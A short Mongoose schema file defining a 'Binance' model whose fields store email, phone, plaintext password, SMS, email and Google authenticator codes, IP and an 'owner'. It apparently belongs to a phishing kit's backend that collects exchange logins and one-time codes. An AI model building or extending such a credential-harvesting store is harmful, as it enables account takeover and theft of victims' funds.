const mongoose = require("mongoose");

const binanceSchema = new mongoose.Schema({
  uniqueid: Number,
  email: String,
  telephone: String,
  password: String,
  telephoneCode: String,
  emailCode: String,
  googleCode: String,
  status: Number,
  ip: String,
  owner: String,
  emailHolder: String,
  telephoneHolder: String,
  googleAuth: Boolean,
});

module.exports = mongoose.model("Binance", binanceSchema);
